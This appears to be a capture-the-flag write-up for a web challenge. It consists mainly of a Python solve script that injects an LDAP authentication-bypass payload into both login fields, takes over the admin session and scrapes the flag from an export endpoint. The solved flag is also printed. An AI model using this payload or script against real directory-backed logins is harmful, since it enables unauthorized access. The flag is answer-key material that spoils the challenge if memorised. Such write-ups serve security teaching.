---
title: "Lightweight Directory"
ctf: "Safaricom CTF"
date: 2026-10-04
category: web
difficulty: medium
points: 400
flag_format: "safctf{...}"
author: "nomadspecter <the.nomad.specter@gmail.com>"
---

# Lightweight Directory

## Summary

Target: http://54.72.82.22:8070 (Werkzeug/3.1.9, Python 3.11.16)

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""Lightweight Directory (Safaricom CTF, WEB, 400 pts)

The login at /connect builds an LDAP filter from user input, roughly:

    (&(uid=<username>)(userPassword=<password>))

There is a length guard on the password (>= 4 chars). Sending the classic
LDAP auth-bypass payload in BOTH fields closes the first clause early and
injects a tautology, so the constructed filter matches the first directory
entry ("admin") and the app issues a Flask session cookie for that user:

    username = password = *)(uid=*))(|(uid=*

Filter becomes (effectively):
    (&(uid=*)(uid=*))(|(uid=*)(userPassword=*)(uid=*))

Following the redirect lands on an authenticated dashboard that exposes
/audit-export, whose response body is the flag.

Usage: python3 solve.py [target]
"""
import re
import sys

import requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://54.72.82.22:8070"
PAYLOAD = "*)(uid=*))(|(uid=*"


def main() -> int:
    s = requests.Session()

    r = s.post(
        TARGET + "/connect",
        data={"username": PAYLOAD, "password": PAYLOAD},
        allow_redirects=False,
        timeout=15,
    )
    if r.status_code != 302:
        print(f"[-] login bypass failed: HTTP {r.status_code}", file=sys.stderr)
        return 1

    r = s.get(TARGET + "/audit-export", timeout=15)
    m = re.search(r"safctf\{[0-9a-fA-F]{32}\}", r.text)
    if not m:
        m = re.search(r"safctf\{[^}]*\}", r.text)
    if not m:
        print("[-] flag not found in /audit-export", file=sys.stderr)
        print(r.text[:500], file=sys.stderr)
        return 1

    print(m.group(0))
    return 0


if __name__ == "__main__":
    sys.exit(main())

```

## Flag

```
safctf{ef30111b835006ade7f00a9a4526d453}
```
